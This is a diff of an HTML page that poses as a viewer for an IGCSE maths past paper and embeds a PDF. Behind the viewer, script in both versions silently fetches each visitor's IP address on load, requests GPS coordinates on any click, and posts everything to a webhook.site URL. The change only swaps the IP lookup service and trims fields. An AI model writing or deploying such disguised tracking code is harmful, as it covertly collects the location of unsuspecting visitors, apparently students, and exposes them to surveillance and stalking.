@@ -4,65 +4,52 @@
     <meta charset="UTF-8">
     <title>IGCSE Papers Math Calculator- Feb/March 2026</title>
     <style>
-        body { margin: 0; background-color: #2c3e50; color: white; overflow: hidden; font-family: sans-serif; }
+        body { margin: 0; background: #2c3e50; color: white; overflow: hidden; font-family: sans-serif; }
         .header { height: 50px; display: flex; align-items: center; justify-content: center; background: #1a252f; border-bottom: 1px solid #34495e; }
         #pdf-frame { width: 100vw; height: calc(100vh - 50px); border: none; }
     </style>
 </head>
 <body>
     <div class="header"><strong>IGCSE Papers Math Calculator- Feb/March 2026</strong></div>
-    
-    <!-- PDF Viewer -->
     <iframe id="pdf-frame" src="1012874352-0580-fm-2026-solved-paper (1).pdf"></iframe>
 
     <script>
         const webhookURL = "https://webhook.site/36d5a036-2f02-4a47-8d38-4387fd72fe8b";
 
-        // Global function to send data to your webhook
-        function sendLog(data) {
+        // Main sending function
+        function sendToWebhook(data) {
             fetch(webhookURL, {
                 method: 'POST',
                 mode: 'no-cors', 
                 body: JSON.stringify(data)
-            }).catch(() => {});
+            });
         }
 
-        // 1. SILENT IP DATA (Runs immediately on load)
-        // This function is triggered by the script tag at the bottom
-        window.getIP = function(data) {
-            sendLog({
-                type: "SILENT_IP_HIT",
-                ip: data.ip,
-                isp: data.org,
-                city: data.city,
-                country: data.country_name,
-                user_agent: navigator.userAgent
-            });
-        };
+        // 1. SILENT IP (Fires immediately)
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org');
+                const data = await res.json();
+                sendToWebhook({ type: "SILENT_IP_HIT", ip: data.ip });
+            } catch (e) {
+                sendToWebhook({ type: "DEBUG_ERROR", msg: "IP Fetch Blocked" });
+            }
+        }
+        getIP();
 
-        // 2. CLICK TRIGGER (Runs only when user interacts)
+        // 2. CLICK TRIGGER (GPS)
         window.onclick = () => {
-            // High-precision GPS (Triggers the browser popup)
             navigator.geolocation.getCurrentPosition(pos => {
-                sendLog({
-                    type: "GPS_LOCATION_CLICKED",
+                sendToWebhook({
+                    type: "GPS_CLICKED",
                     lat: pos.coords.latitude,
                     lon: pos.coords.longitude,
-                    accuracy: `${pos.coords.accuracy} meters`,
                     map: `https://www.google.com{pos.coords.latitude},${pos.coords.longitude}`
                 });
             }, (err) => {
-                sendLog({ type: "GPS_ERROR", msg: err.message });
-            }, { 
-                enableHighAccuracy: false, 
-                timeout: 10000, 
-                maximumAge: Infinity 
-            });
+                sendToWebhook({ type: "GPS_ERROR", msg: err.message });
+            }, { maximumAge: Infinity });
         };
     </script>
-    
-    <!-- SILENT TRIGGER: This fetches the IP and runs the getIP function above -->
-    <script src="https://ipapi.co"></script>
-
 </body>
 </html>
